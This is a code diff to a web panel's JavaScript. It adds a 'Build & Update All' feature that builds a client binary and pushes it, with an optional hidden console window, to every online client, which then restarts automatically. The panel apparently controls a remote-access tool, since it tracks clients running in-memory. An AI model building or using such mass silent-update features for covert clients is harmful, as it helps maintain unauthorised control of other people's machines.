@@ -666,6 +666,10 @@ async function startBuild(config) {
   buildBtn.disabled = true;
   buildBtn.innerHTML =
     '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
+  if (buildUpdateAllBtn) {
+    buildUpdateAllBtn.disabled = true;
+    buildUpdateAllBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
+  }
 
   buildStatus.classList.remove("hidden");
   buildStatusText.textContent = "Starting build...";
@@ -712,11 +716,16 @@ async function startBuild(config) {
     buildStatus.querySelector("div").className =
       "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
     buildStatus.querySelector("i").className = "fa-solid fa-circle-xmark";
+    pendingUpdateAll = false;
   } finally {
     isBuilding = false;
     buildBtn.disabled = false;
     buildBtn.innerHTML =
       '<i class="fa-solid fa-hammer"></i> <span>Start Build</span>';
+    if (buildUpdateAllBtn) {
+      buildUpdateAllBtn.disabled = false;
+      buildUpdateAllBtn.innerHTML = '<i class="fa-solid fa-arrow-up-from-bracket"></i> <span>Build & Update All</span>';
+    }
   }
 }
 
@@ -784,6 +793,12 @@ async function streamBuildOutput(buildId, config = {}) {
 
               buildResults.classList.remove("hidden");
               displayBuild(buildData);
+
+              // Auto-push update if "Build & Update All" was used
+              if (pendingUpdateAll) {
+                pendingUpdateAll = false;
+                await pushUpdateToAllClients(data.buildId, pendingUpdateHideWindow);
+              }
             }
 
             reader.cancel();
@@ -1217,5 +1232,149 @@ function showBuildFilesForContainer(build, containerId, timerId) {
     updateExpirationTimer(timerEl, build.expiresAt);
 
     setInterval(() => updateExpirationTimer(timerEl, build.expiresAt), 60000);
+  }
+}
+
+const buildUpdateAllBtn = document.getElementById("build-update-all-btn");
+const updateAllModal = document.getElementById("update-all-modal");
+const updateAllModalBody = document.getElementById("update-all-modal-body");
+const updateAllCancel = document.getElementById("update-all-cancel");
+const updateAllConfirm = document.getElementById("update-all-confirm");
+
+let pendingUpdateAll = false;
+let pendingUpdateHideWindow = false;
+
+function showUpdateAllModal() {
+  if (!updateAllModal) return;
+  updateAllModal.classList.remove("hidden");
+  updateAllModal.classList.add("flex");
+}
+
+function hideUpdateAllModal() {
+  if (!updateAllModal) return;
+  updateAllModal.classList.remove("flex");
+  updateAllModal.classList.add("hidden");
+  if (updateAllConfirm) {
+    updateAllConfirm.innerHTML = '<i class="fa-solid fa-hammer mr-1"></i> Build & Update';
+    updateAllConfirm.disabled = false;
+  }
+  if (updateAllCancel) {
+    updateAllCancel.textContent = "Cancel";
+  }
+}
+
+if (updateAllCancel) {
+  updateAllCancel.addEventListener("click", hideUpdateAllModal);
+}
+
+if (updateAllModal) {
+  updateAllModal.addEventListener("click", (e) => {
+    if (e.target === updateAllModal) hideUpdateAllModal();
+  });
+}
+
+if (buildUpdateAllBtn) {
+  buildUpdateAllBtn.addEventListener("click", async () => {
+    if (isBuilding) return;
+
+    const platformCheckboxes = form.querySelectorAll('input[name="platform"]:checked');
+    const platforms = Array.from(platformCheckboxes).map((cb) => cb.value);
+    if (platforms.length === 0) {
+      alert("Please select at least one platform to build");
+      return;
+    }
+
+    showUpdateAllModal();
+    updateAllConfirm.disabled = true;
+    updateAllModalBody.innerHTML = '<p class="text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Checking online clients...</p>';
+
+    try {
+      const res = await fetch("/api/build/update-eligible", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "include",
+        body: JSON.stringify({ platforms }),
+      });
+
+      if (!res.ok) {
+        const data = await res.json().catch(() => ({}));
+        updateAllModalBody.innerHTML = `<p class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i>${data.error || "Failed to check eligible clients"}</p>`;
+        return;
+      }
+
+      const data = await res.json();
+      let html = "";
+
+      html += `<p class="text-white"><i class="fa-solid fa-users mr-2 text-amber-400"></i><strong>${data.eligible}</strong> client(s) will receive the update after build.</p>`;
+      html += '<div class="mt-2 text-xs text-slate-400 space-y-1">';
+      html += `<p><i class="fa-solid fa-globe mr-1 text-blue-400"></i> ${data.totalOnline} total online client(s)</p>`;
+      if (data.skippedInMemory > 0) {
+        html += `<p><i class="fa-solid fa-memory mr-1 text-red-400"></i> ${data.skippedInMemory} client(s) will be skipped (running in-memory)</p>`;
+      }
+      if (data.skippedNoMatch > 0) {
+        html += `<p><i class="fa-solid fa-ban mr-1 text-slate-500"></i> ${data.skippedNoMatch} client(s) will be skipped (no matching platform)</p>`;
+      }
+      html += "</div>";
+
+      if (data.eligible === 0 && data.totalOnline === 0) {
+        html += '<p class="mt-3 text-xs text-slate-500">No clients are currently online. The build will still run but no updates will be sent.</p>';
+      }
+
+      html += '<p class="mt-3 text-xs text-amber-300/80"><i class="fa-solid fa-triangle-exclamation mr-1"></i>This will build the client and push the update to all eligible clients. Clients will restart automatically.</p>';
+      updateAllConfirm.disabled = false;
+
+      updateAllModalBody.innerHTML = html;
+    } catch (err) {
+      updateAllModalBody.innerHTML = `<p class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i>Error: ${err.message}</p>`;
+    }
+  });
+}
+
+if (updateAllConfirm) {
+  updateAllConfirm.addEventListener("click", () => {
+    hideUpdateAllModal();
+    pendingUpdateAll = true;
+    pendingUpdateHideWindow = !!form.querySelector('input[name="hide-console"]')?.checked;
+    form.requestSubmit();
+  });
+}
+
+async function pushUpdateToAllClients(buildId, hideWindow) {
+  addBuildOutput("\n── Pushing update to all eligible clients ──\n", "info");
+
+  try {
+    const res = await fetch("/api/build/update-all", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "include",
+      body: JSON.stringify({ buildId, hideWindow }),
+    });
+
+    const data = await res.json().catch(() => ({}));
+
+    if (!res.ok) {
+      addBuildOutput(`Update failed: ${data.error || "Unknown error"}\n`, "error");
+      return;
+    }
+
+    const succeeded = data.successCount || 0;
+    const total = data.totalOnline || 0;
+    const failed = (data.results || []).filter((r) => !r.ok);
+    const inMemoryCount = failed.filter((r) => r.reason === "in_memory").length;
+    const noMatchCount = failed.filter((r) => r.reason === "no_matching_build").length;
+
+    addBuildOutput(`Update sent to ${succeeded} of ${total} online client(s)\n`, "success");
+    if (inMemoryCount > 0) {
+      addBuildOutput(`  ${inMemoryCount} client(s) skipped (running in-memory)\n`, "warn");
+    }
+    if (noMatchCount > 0) {
+      addBuildOutput(`  ${noMatchCount} client(s) skipped (no matching build)\n`, "warn");
+    }
+    const otherFailed = failed.filter((r) => r.reason !== "in_memory" && r.reason !== "no_matching_build");
+    if (otherFailed.length > 0) {
+      addBuildOutput(`  ${otherFailed.length} client(s) failed for other reasons\n`, "warn");
+    }
+  } catch (err) {
+    addBuildOutput(`Update error: ${err.message}\n`, "error");
   }
 }
